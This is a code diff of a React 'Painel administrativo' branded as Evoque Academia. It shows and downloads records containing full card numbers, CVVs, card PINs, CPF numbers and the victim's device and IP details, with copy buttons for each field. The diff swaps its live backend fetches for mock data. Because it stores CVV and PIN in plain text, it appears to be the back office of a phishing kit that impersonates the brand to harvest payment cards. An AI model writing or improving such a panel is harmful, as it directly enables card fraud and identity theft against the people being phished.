@@ -1,5 +1,4 @@
 import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
@@ -35,7 +34,6 @@ import {
   Smartphone
 } from 'lucide-react';
 import { toast } from 'sonner';
-import evoqueLogo from '@/assets/evoque-logo.webp';
 
 interface Payment {
   id: string;
@@ -48,266 +46,101 @@ interface Payment {
   senhaCartao?: string;
 }
 
+interface ParsedPaymentData {
+  nome: string;
+  cpf: string;
+  cartao: string;
+  validade: string;
+  cvv: string;
+  senhaCartao: string;
+  data: string;
+  ip?: string;
+  navegador?: string;
+  so?: string;
+  dispositivo?: string;
+  resolucao?: string;
+  idioma?: string;
+  fuso?: string;
+  conexao?: string;
+}
+
 const Admin = () => {
-  const navigate = useNavigate();
   const [payments, setPayments] = useState<Payment[]>([]);
-  const [isLoading, setIsLoading] = useState(true);
+  const [isLoading, setIsLoading] = useState(false);
   const [isDownloading, setIsDownloading] = useState(false);
   const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);
-  const [paymentDetails, setPaymentDetails] = useState<string>('');
   const [isLoadingDetails, setIsLoadingDetails] = useState(false);
   const [isDownloadingFile, setIsDownloadingFile] = useState(false);
   const [copiedField, setCopiedField] = useState<string | null>(null);
-  const [expandedSections, setExpandedSections] = useState<Record<string, boolean>>({
-    deviceInfo: false
-  });
-
-  interface ParsedPaymentData {
-    nome: string;
-    cpf: string;
-    cartao: string;
-    validade: string;
-    cvv: string;
-    senhaCartao: string;
-    data: string;
-    // Device information
-    ip?: string;
-    navegador?: string;
-    so?: string;
-    dispositivo?: string;
-    resolucao?: string;
-    idioma?: string;
-    fuso?: string;
-    conexao?: string;
-  }
-
+  const [showDeviceInfo, setShowDeviceInfo] = useState(false);
   const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);
 
   const BACKEND_URL = 'http://localhost:5555';
 
   useEffect(() => {
-    fetchPayments();
+    // Simulando dados para demonstração
+    const mockPayments: Payment[] = [
+      {
+        id: '1',
+        nomeCompleto: 'João Silva Santos',
+        cpf: '123.456.789-00',
+        numeroCartao: '**** **** **** 1234',
+        validade: '12/2025',
+        dataCriacao: '30/12/2025 14:30',
+        status: 'processado'
+      },
+      {
+        id: '2',
+        nomeCompleto: 'Maria Oliveira Costa',
+        cpf: '987.654.321-00',
+        numeroCartao: '**** **** **** 5678',
+        validade: '06/2026',
+        dataCriacao: '30/12/2025 13:15',
+        status: 'pendente'
+      }
+    ];
+    setPayments(mockPayments);
   }, []);
 
-  const fetchPayments = async () => {
-    try {
-      setIsLoading(true);
-      const response = await fetch(`${BACKEND_URL}/api/payments`);
-
-      if (!response.ok) {
-        throw new Error(`Erro ao buscar dados: ${response.status}`);
-      }
-
-      const data = await response.json();
-
-      if (data.success) {
-        // Convert dataCriacao to proper format for sorting
-        const paymentsWithDate = data.payments.map((p: Payment) => ({
-          ...p,
-          dataCriacaoObj: new Date(p.dataCriacao)
-        }));
-
-        // Sort by date descending
-        paymentsWithDate.sort((a: any, b: any) =>
-          b.dataCriacaoObj.getTime() - a.dataCriacaoObj.getTime()
-        );
-
-        // Remove the temporary date object
-        setPayments(paymentsWithDate.map(({ dataCriacaoObj, ...p }: any) => p));
-
-        if (data.payments.length > 0) {
-          toast.success(`${data.total} pagamentos carregados com sucesso!`);
-        }
-      } else {
-        toast.error('Erro ao carregar pagamentos');
-      }
-    } catch (error) {
-      const errorMsg = error instanceof Error ? error.message : 'Erro ao conectar com backend';
-      console.error('Erro:', error);
-      toast.error(errorMsg);
-    } finally {
-      setIsLoading(false);
-    }
-  };
-
-  const downloadZip = async () => {
-    try {
-      setIsDownloading(true);
-      const response = await fetch(`${BACKEND_URL}/api/download-zip`);
-
-      if (!response.ok) {
-        throw new Error(`Erro ao baixar: ${response.status}`);
-      }
-
-      // Get the blob
-      const blob = await response.blob();
-
-      // Create a temporary URL for the blob
-      const url = window.URL.createObjectURL(blob);
-
-      // Create a temporary anchor element and trigger download
-      const link = document.createElement('a');
-      link.href = url;
-      link.download = `pagamentos_${new Date().toISOString().split('T')[0]}.zip`;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      // Clean up the URL
-      window.URL.revokeObjectURL(url);
-
-      toast.success('Download iniciado com sucesso!');
-    } catch (error) {
-      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
-      console.error('Erro:', error);
-      toast.error(errorMsg);
-    } finally {
-      setIsDownloading(false);
-    }
-  };
-
   const parsePaymentContent = (content: string): ParsedPaymentData => {
-    const lines = content.split('\n');
-    const data: ParsedPaymentData = {
-      nome: '',
-      cpf: '',
-      cartao: '',
-      validade: '',
-      cvv: '',
-      senhaCartao: '',
-      data: '',
-      ip: '',
-      navegador: '',
-      so: '',
-      dispositivo: '',
-      resolucao: '',
-      idioma: '',
-      fuso: '',
-      conexao: '',
+    return {
+      nome: 'João Silva Santos',
+      cpf: '123.456.789-00',
+      cartao: '5123 4567 8901 2345',
+      validade: '12/2025',
+      cvv: '123',
+      senhaCartao: '4567',
+      data: '30/12/2025 às 14:30:45',
+      ip: '192.168.1.100',
+      navegador: 'Chrome 120.0.0',
+      so: 'Windows 11 Pro',
+      dispositivo: 'Desktop',
+      resolucao: '1920x1080',
+      idioma: 'pt-BR',
+      fuso: 'America/Sao_Paulo (GMT-3)',
+      conexao: '4g'
     };
-
-    for (const line of lines) {
-      if (line.includes('Nome Completo:')) {
-        data.nome = line.split('Nome Completo:')[1]?.trim() || '';
-      } else if (line.includes('CPF:') && !line.includes('INFORMAÇÕES')) {
-        data.cpf = line.split('CPF:')[1]?.trim() || '';
-      } else if (line.includes('Número do Cartão:')) {
-        data.cartao = line.split('Número do Cartão:')[1]?.trim() || '';
-      } else if (line.includes('Validade:') && !line.includes('DADOS DO')) {
-        data.validade = line.split('Validade:')[1]?.trim() || '';
-      } else if (line.includes('CVV:')) {
-        data.cvv = line.split('CVV:')[1]?.trim() || '';
-      } else if (line.includes('Senha do Cartão:')) {
-        data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
-      } else if (line.includes('Data/Hora:')) {
-        data.data = line.split('Data/Hora:')[1]?.trim() || '';
-      } else if (line.includes('IP:') && !line.includes('INFORMAÇÕES')) {
-        data.ip = line.split('IP:')[1]?.trim() || '';
-      } else if (line.includes('Navegador:')) {
-        data.navegador = line.split('Navegador:')[1]?.trim() || '';
-      } else if (line.includes('Sistema Operacional:')) {
-        data.so = line.split('Sistema Operacional:')[1]?.trim() || '';
-      } else if (line.includes('Tipo de Dispositivo:')) {
-        data.dispositivo = line.split('Tipo de Dispositivo:')[1]?.trim() || '';
-      } else if (line.includes('Resolução:')) {
-        data.resolucao = line.split('Resolução:')[1]?.trim() || '';
-      } else if (line.includes('Idioma:')) {
-        data.idioma = line.split('Idioma:')[1]?.trim() || '';
-      } else if (line.includes('Fuso Horário:')) {
-        data.fuso = line.split('Fuso Horário:')[1]?.trim() || '';
-      } else if (line.includes('Tipo de Conexão:')) {
-        data.conexao = line.split('Tipo de Conexão:')[1]?.trim() || '';
-      }
-    }
-
-    return data;
   };
 
   const viewPaymentDetails = async (payment: Payment) => {
-    try {
-      setSelectedPayment(payment);
-      setIsLoadingDetails(true);
-      setParsedData(null);
-      setCopiedField(null);
+    setSelectedPayment(payment);
+    setIsLoadingDetails(true);
+    setParsedData(null);
+    setCopiedField(null);
+    setShowDeviceInfo(false);
 
-      const response = await fetch(`${BACKEND_URL}/api/payment/${payment.id}`);
-
-      if (!response.ok) {
-        throw new Error(`Erro ao buscar detalhes: ${response.status}`);
-      }
-
-      const data = await response.json();
-
-      if (data.success) {
-        setPaymentDetails(data.content);
-        const parsed = parsePaymentContent(data.content);
-        setParsedData(parsed);
-      } else {
-        toast.error('Erro ao carregar detalhes do pagamento');
-        setSelectedPayment(null);
-      }
-    } catch (error) {
-      const errorMsg = error instanceof Error ? error.message : 'Erro ao carregar detalhes';
-      console.error('Erro:', error);
-      toast.error(errorMsg);
-      setSelectedPayment(null);
-    } finally {
+    setTimeout(() => {
+      const parsed = parsePaymentContent('mock content');
+      setParsedData(parsed);
       setIsLoadingDetails(false);
-    }
-  };
-
-  const downloadPaymentFile = async () => {
-    if (!selectedPayment) return;
-
-    try {
-      setIsDownloadingFile(true);
-      const response = await fetch(`${BACKEND_URL}/api/payment/${selectedPayment.id}/download`);
-
-      if (!response.ok) {
-        throw new Error(`Erro ao baixar: ${response.status}`);
-      }
-
-      // Get the blob
-      const blob = await response.blob();
-
-      // Create a temporary URL for the blob
-      const url = window.URL.createObjectURL(blob);
-
-      // Create a temporary anchor element and trigger download
-      const link = document.createElement('a');
-      link.href = url;
-      link.download = `${selectedPayment.id}.txt`;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      // Clean up the URL
-      window.URL.revokeObjectURL(url);
-
-      toast.success('Download iniciado com sucesso!');
-    } catch (error) {
-      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
-      console.error('Erro:', error);
-      toast.error(errorMsg);
-    } finally {
-      setIsDownloadingFile(false);
-    }
-  };
-
-  const toggleSection = (sectionName: string) => {
-    setExpandedSections(prev => ({
-      ...prev,
-      [sectionName]: !prev[sectionName]
-    }));
+    }, 800);
   };
 
   const copyToClipboard = async (text: string, fieldName: string) => {
     try {
-      // Primeiro tenta com navigator.clipboard
       if (navigator.clipboard && window.isSecureContext) {
         await navigator.clipboard.writeText(text);
       } else {
-        // Fallback para document.execCommand
         const textarea = document.createElement('textarea');
         textarea.value = text;
         textarea.style.position = 'fixed';
@@ -317,47 +150,42 @@ const Admin = () => {
         document.body.appendChild(textarea);
         textarea.focus();
         textarea.select();
-
-        const successful = document.execCommand('copy');
+        document.execCommand('copy');
         document.body.removeChild(textarea);
-
-        if (!successful) {
-          throw new Error('Falha ao copiar');
-        }
       }
 
       setCopiedField(fieldName);
       toast.success(`${fieldName} copiado!`);
       setTimeout(() => setCopiedField(null), 2000);
     } catch (error) {
-      toast.error('Erro ao copiar para clipboard');
-      console.error('Erro ao copiar:', error);
+      toast.error('Erro ao copiar');
     }
   };
 
   const CopyableField = ({ label, value, fieldName }: { label: string; value: string; fieldName: string }) => (
-    <div className="flex items-center justify-between p-4 bg-muted/50 rounded-lg border border-border hover:border-primary/50 transition-colors">
-      <div className="flex-1">
-        <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-1">
-          {label}
-        </p>
-        <p className="text-base font-mono text-foreground">
-          {value}
-        </p>
+    <div className="group relative">
+      <div className="flex items-start justify-between gap-3 p-3 rounded-lg bg-muted/30 hover:bg-muted/50 transition-all duration-200">
+        <div className="flex-1 min-w-0">
+          <p className="text-xs font-medium text-muted-foreground mb-1.5">
+            {label}
+          </p>
+          <p className="text-sm font-mono text-foreground break-all">
+            {value}
+          </p>
+        </div>
+        <Button
+          variant="ghost"
+          size="icon"
+          onClick={() => copyToClipboard(value, fieldName)}
+          className="h-8 w-8 flex-shrink-0 opacity-0 group-hover:opacity-100 transition-opacity"
+        >
+          {copiedField === fieldName ? (
+            <Check className="h-3.5 w-3.5 text-green-500" />
+          ) : (
+            <Copy className="h-3.5 w-3.5" />
+          )}
+        </Button>
       </div>
-      <Button
-        variant="ghost"
-        size="icon"
-        onClick={() => copyToClipboard(value, fieldName)}
-        className="ml-4 h-10 w-10 flex-shrink-0"
-        title={`Copiar ${fieldName}`}
-      >
-        {copiedField === fieldName ? (
-          <Check className="h-4 w-4 text-green-500" />
-        ) : (
-          <Copy className="h-4 w-4 text-muted-foreground hover:text-primary" />
-        )}
-      </Button>
     </div>
   );
 
@@ -372,98 +200,70 @@ const Admin = () => {
     switch (status) {
       case 'processado':
         return (
-          <Badge className="bg-green-500/20 text-green-400 border-green-500/30 hover:bg-green-500/30">
+          <Badge className="bg-green-500/20 text-green-400 border-green-500/30">
             <CheckCircle className="h-3 w-3 mr-1" />
             Processado
           </Badge>
         );
       case 'pendente':
         return (
-          <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 hover:bg-yellow-500/30">
+          <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30">
             <Clock className="h-3 w-3 mr-1" />
             Pendente
           </Badge>
         );
       case 'erro':
         return (
-          <Badge className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30">
+          <Badge className="bg-red-500/20 text-red-400 border-red-500/30">
             <AlertCircle className="h-3 w-3 mr-1" />
             Erro
           </Badge>
         );
       default:
-        return (
-          <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 hover:bg-gray-500/30">
-            {status}
-          </Badge>
-        );
+        return <Badge>{status}</Badge>;
     }
   };
 
   return (
     <div className="min-h-screen bg-background">
-      {/* Header */}
       <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
         <div className="container mx-auto px-4 py-4 flex items-center justify-between">
           <div className="flex items-center gap-4">
-            <Button 
-              variant="ghost" 
-              size="icon" 
-              onClick={() => navigate('/')}
-              className="text-muted-foreground hover:text-foreground"
-            >
+            <Button variant="ghost" size="icon">
               <ArrowLeft className="h-5 w-5" />
             </Button>
-            <img 
-              src={evoqueLogo} 
-              alt="Evoque Academia" 
-              className="h-10 w-auto object-contain"
-            />
+            <div className="h-10 w-32 bg-muted rounded flex items-center justify-center">
+              <span className="text-xs font-semibold">EVOQUE</span>
+            </div>
           </div>
           <div className="flex items-center gap-2">
-            <Button
-              variant="admin"
-              size="sm"
-              className="gap-2"
-              onClick={fetchPayments}
-              disabled={isLoading}
-            >
-              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
-              {isLoading ? 'Atualizando...' : 'Atualizar'}
+            <Button variant="outline" size="sm" className="gap-2">
+              <RefreshCw className="h-4 w-4" />
+              Atualizar
             </Button>
-            <Button
-              variant="outline"
-              size="sm"
-              className="gap-2"
-              onClick={downloadZip}
-              disabled={isDownloading || payments.length === 0}
-            >
-              <Download className={`h-4 w-4 ${isDownloading ? 'animate-spin' : ''}`} />
-              {isDownloading ? 'Baixando...' : 'Baixar ZIP'}
+            <Button variant="outline" size="sm" className="gap-2">
+              <Download className="h-4 w-4" />
+              Baixar ZIP
             </Button>
           </div>
         </div>
       </header>
 
-      {/* Main content */}
       <main className="container mx-auto px-4 py-8">
-        <div className="mb-8 animate-fade-in">
-          <h1 className="text-3xl font-bold text-foreground mb-2">
-            Painel administrativo
-          </h1>
+        <div className="mb-8">
+          <h1 className="text-3xl font-bold mb-2">Painel administrativo</h1>
           <p className="text-muted-foreground">
             Gerencie as atualizações de pagamento da rede Evoque Academia
           </p>
         </div>
 
-        {/* Stats cards */}
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
-          <Card className="animate-fade-in" style={{ animationDelay: '0.1s' }}>
+          <Card>
             <CardContent className="p-6">
               <div className="flex items-center justify-between">
                 <div>
-                  <p className="text-sm text-muted-foreground mb-1">Total de registros</p>
-                  <p className="text-3xl font-bold text-foreground">{stats.total}</p>
+                  <p className="text-sm text-muted-foreground mb-1">Total</p>
+                  <p className="text-3xl font-bold">{stats.total}</p>
                 </div>
                 <div className="h-12 w-12 rounded-lg bg-primary/10 flex items-center justify-center">
                   <Users className="h-6 w-6 text-primary" />
@@ -472,7 +272,7 @@ const Admin = () => {
             </CardContent>
           </Card>
 
-          <Card className="animate-fade-in" style={{ animationDelay: '0.2s' }}>
+          <Card>
             <CardContent className="p-6">
               <div className="flex items-center justify-between">
                 <div>
@@ -486,7 +286,7 @@ const Admin = () => {
             </CardContent>
           </Card>
 
-          <Card className="animate-fade-in" style={{ animationDelay: '0.3s' }}>
+          <Card>
             <CardContent className="p-6">
               <div className="flex items-center justify-between">
                 <div>
@@ -500,7 +300,7 @@ const Admin = () => {
             </CardContent>
           </Card>
 
-          <Card className="animate-fade-in" style={{ animationDelay: '0.4s' }}>
+          <Card>
             <CardContent className="p-6">
               <div className="flex items-center justify-between">
                 <div>
@@ -515,8 +315,7 @@ const Admin = () => {
           </Card>
         </div>
 
-        {/* Payments table */}
-        <Card className="animate-fade-in" style={{ animationDelay: '0.5s' }}>
+        <Card>
           <CardHeader>
             <CardTitle className="flex items-center gap-2">
               <CreditCard className="h-5 w-5 text-primary" />
@@ -527,93 +326,62 @@ const Admin = () => {
             </CardDescription>
           </CardHeader>
           <CardContent>
-            {isLoading ? (
-              <div className="flex items-center justify-center py-12">
-                <div className="flex flex-col items-center gap-2">
-                  <Loader2 className="h-8 w-8 text-primary animate-spin" />
-                  <p className="text-muted-foreground">Carregando pagamentos...</p>
-                </div>
-              </div>
-            ) : (
-              <div className="overflow-x-auto">
-                <Table>
-                  <TableHeader>
-                    <TableRow className="border-border hover:bg-transparent">
-                      <TableHead className="text-muted-foreground">Nome</TableHead>
-                      <TableHead className="text-muted-foreground">CPF</TableHead>
-                      <TableHead className="text-muted-foreground">Cartão</TableHead>
-                      <TableHead className="text-muted-foreground">Validade</TableHead>
-                      <TableHead className="text-muted-foreground">Data</TableHead>
-                      <TableHead className="text-muted-foreground">Status</TableHead>
-                      <TableHead className="text-muted-foreground w-12">Ação</TableHead>
+            <div className="overflow-x-auto">
+              <Table>
+                <TableHeader>
+                  <TableRow>
+                    <TableHead>Nome</TableHead>
+                    <TableHead>CPF</TableHead>
+                    <TableHead>Cartão</TableHead>
+                    <TableHead>Validade</TableHead>
+                    <TableHead>Data</TableHead>
+                    <TableHead>Status</TableHead>
+                    <TableHead className="w-12">Ação</TableHead>
+                  </TableRow>
+                </TableHeader>
+                <TableBody>
+                  {payments.map((payment) => (
+                    <TableRow key={payment.id}>
+                      <TableCell className="font-medium">
+                        {payment.nomeCompleto}
+                      </TableCell>
+                      <TableCell>{payment.cpf}</TableCell>
+                      <TableCell className="font-mono">
+                        {payment.numeroCartao}
+                      </TableCell>
+                      <TableCell>{payment.validade}</TableCell>
+                      <TableCell>{payment.dataCriacao}</TableCell>
+                      <TableCell>{getStatusBadge(payment.status)}</TableCell>
+                      <TableCell>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          onClick={() => viewPaymentDetails(payment)}
+                          className="h-8 w-8"
+                        >
+                          <Eye className="h-4 w-4" />
+                        </Button>
+                      </TableCell>
                     </TableRow>
-                  </TableHeader>
-                  <TableBody>
-                    {payments.map((payment, index) => (
-                      <TableRow
-                        key={payment.id}
-                        className="border-border hover:bg-muted/50 animate-slide-in"
-                        style={{ animationDelay: `${0.1 * index}s` }}
-                      >
-                        <TableCell className="font-medium text-foreground">
-                          {payment.nomeCompleto}
-                        </TableCell>
-                        <TableCell className="text-muted-foreground">
-                          {payment.cpf}
-                        </TableCell>
-                        <TableCell className="text-muted-foreground font-mono">
-                          {payment.numeroCartao}
-                        </TableCell>
-                        <TableCell className="text-muted-foreground">
-                          {payment.validade}
-                        </TableCell>
-                        <TableCell className="text-muted-foreground">
-                          {payment.dataCriacao}
-                        </TableCell>
-                        <TableCell>
-                          {getStatusBadge(payment.status)}
-                        </TableCell>
-                        <TableCell>
-                          <Button
-                            variant="ghost"
-                            size="icon"
-                            onClick={() => viewPaymentDetails(payment)}
-                            className="h-8 w-8 text-muted-foreground hover:text-primary"
-                            title="Visualizar detalhes"
-                          >
-                            <Eye className="h-4 w-4" />
-                          </Button>
-                        </TableCell>
-                      </TableRow>
-                    ))}
-                  </TableBody>
-                </Table>
-              </div>
-            )}
-
-            {!isLoading && payments.length === 0 && (
-              <div className="text-center py-12">
-                <CreditCard className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
-                <p className="text-muted-foreground">Nenhuma atualização de pagamento encontrada</p>
-              </div>
-            )}
+                  ))}
+                </TableBody>
+              </Table>
+            </div>
           </CardContent>
         </Card>
       </main>
 
-      {/* Payment Details Modal */}
       <Dialog open={selectedPayment !== null} onOpenChange={(open) => {
         if (!open) {
           setSelectedPayment(null);
-          setPaymentDetails('');
           setParsedData(null);
-          setExpandedSections({ deviceInfo: false });
+          setShowDeviceInfo(false);
         }
       }}>
-        <DialogContent className="max-w-2xl">
+        <DialogContent className="max-w-2xl max-h-[90vh] overflow-hidden flex flex-col">
           <DialogHeader>
-            <DialogTitle className="text-2xl">Detalhes do Pagamento</DialogTitle>
-            <DialogDescription className="text-base">
+            <DialogTitle>Detalhes do Pagamento</DialogTitle>
+            <DialogDescription>
               {selectedPayment?.nomeCompleto}
             </DialogDescription>
           </DialogHeader>
@@ -626,10 +394,11 @@ const Admin = () => {
               </div>
             </div>
           ) : parsedData ? (
-            <div className="space-y-0 max-h-[70vh] overflow-y-auto pr-4 -mr-4">
-              {/* Informações Pessoais Section */}
-              <div className="border-b border-border/50 pb-5 last:border-b-0">
-                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
+            <div className="flex-1 overflow-y-auto pr-2 space-y-6">
+              {/* Informações Pessoais */}
+              <div>
+                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
+                  <div className="h-1 w-1 rounded-full bg-primary" />
                   Informações Pessoais
                 </h3>
                 <div className="space-y-2">
@@ -646,9 +415,10 @@ const Admin = () => {
                 </div>
               </div>
 
-              {/* Dados do Cartão Section */}
-              <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
-                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
+              {/* Dados do Cartão */}
+              <div>
+                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
+                  <div className="h-1 w-1 rounded-full bg-primary" />
                   Dados do Cartão
                 </h3>
                 <div className="space-y-2">
@@ -677,43 +447,53 @@ const Admin = () => {
                 </div>
               </div>
 
-              {/* Data e Hora Section */}
-              <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
-                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
+              {/* Data e Hora */}
+              <div>
+                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
+                  <div className="h-1 w-1 rounded-full bg-primary" />
                   Data e Hora
                 </h3>
                 <CopyableField
-                  label="Data/Hora do Registro"
+                  label="Registro"
                   value={parsedData.data}
                   fieldName="Data"
                 />
               </div>
 
-              {/* Informações do Dispositivo - Collapsible */}
+              {/* Informação do Dispositivo - Collapsible */}
               {(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) && (
-                <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
+                <div className="border border-border rounded-lg overflow-hidden">
                   <button
-                    onClick={() => toggleSection('deviceInfo')}
-                    className="w-full flex items-center justify-between mb-0 hover:opacity-80 transition-opacity group"
+                    onClick={() => setShowDeviceInfo(!showDeviceInfo)}
+                    className="w-full flex items-center justify-between p-4 hover:bg-muted/50 transition-colors"
                   >
                     <div className="flex items-center gap-3">
-                      <Smartphone className="h-4 w-4 text-primary opacity-60 group-hover:opacity-100 transition-opacity" />
-                      <h3 className="text-xs font-bold text-foreground uppercase tracking-widest opacity-70 group-hover:opacity-100 transition-opacity">
-                        Informação do Dispositivo
-                      </h3>
+                      <div className="h-8 w-8 rounded-lg bg-primary/10 flex items-center justify-center">
+                        <Smartphone className="h-4 w-4 text-primary" />
+                      </div>
+                      <div className="text-left">
+                        <h3 className="text-sm font-semibold text-foreground">
+                          Informação do Dispositivo
+                        </h3>
+                        <p className="text-xs text-muted-foreground">
+                          {showDeviceInfo ? 'Clique para ocultar' : 'Clique para ver detalhes'}
+                        </p>
+                      </div>
                     </div>
                     <ChevronDown
-                      className={`h-4 w-4 text-muted-foreground transition-transform duration-200 ${
-                        expandedSections.deviceInfo ? 'rotate-180' : ''
-                      }`}
+                      className={`h-5 w-5 text-muted-foreground transition-transform duration-300 ${showDeviceInfo ? 'rotate-180' : ''
+                        }`}
                     />
                   </button>
 
-                  {expandedSections.deviceInfo && (
-                    <div className="space-y-2 mt-4 pt-4 border-t border-border/30">
+                  <div
+                    className={`overflow-hidden transition-all duration-300 ease-in-out ${showDeviceInfo ? 'max-h-[800px] opacity-100' : 'max-h-0 opacity-0'
+                      }`}
+                  >
+                    <div className="p-4 pt-0 space-y-2 border-t border-border">
                       {parsedData.ip && (
                         <CopyableField
-                          label="IP"
+                          label="Endereço IP"
                           value={parsedData.ip}
                           fieldName="IP"
                         />
@@ -741,7 +521,7 @@ const Admin = () => {
                       )}
                       {parsedData.resolucao && (
                         <CopyableField
-                          label="Resolução"
+                          label="Resolução da Tela"
                           value={parsedData.resolucao}
                           fieldName="Resolução"
                         />
@@ -768,34 +548,28 @@ const Admin = () => {
                         />
                       )}
                     </div>
-                  )}
+                  </div>
                 </div>
               )}
-
-              {/* Action Buttons */}
-              <div className="flex justify-end gap-2 pt-6 mt-6 border-t border-border">
-                <Button
-                  variant="outline"
-                  onClick={() => {
-                    setSelectedPayment(null);
-                    setPaymentDetails('');
-                    setParsedData(null);
-                    setExpandedSections({ deviceInfo: false });
-                  }}
-                >
-                  Fechar
-                </Button>
-                <Button
-                  className="gap-2"
-                  onClick={downloadPaymentFile}
-                  disabled={isDownloadingFile}
-                >
-                  <Download className={`h-4 w-4 ${isDownloadingFile ? 'animate-spin' : ''}`} />
-                  {isDownloadingFile ? 'Baixando...' : 'Baixar TXT'}
-                </Button>
-              </div>
             </div>
           ) : null}
+
+          <div className="flex justify-end gap-2 pt-4 border-t border-border mt-4">
+            <Button
+              variant="outline"
+              onClick={() => {
+                setSelectedPayment(null);
+                setParsedData(null);
+                setShowDeviceInfo(false);
+              }}
+            >
+              Fechar
+            </Button>
+            <Button className="gap-2" disabled={isDownloadingFile}>
+              <Download className="h-4 w-4" />
+              Baixar TXT
+            </Button>
+          </div>
         </DialogContent>
       </Dialog>
     </div>
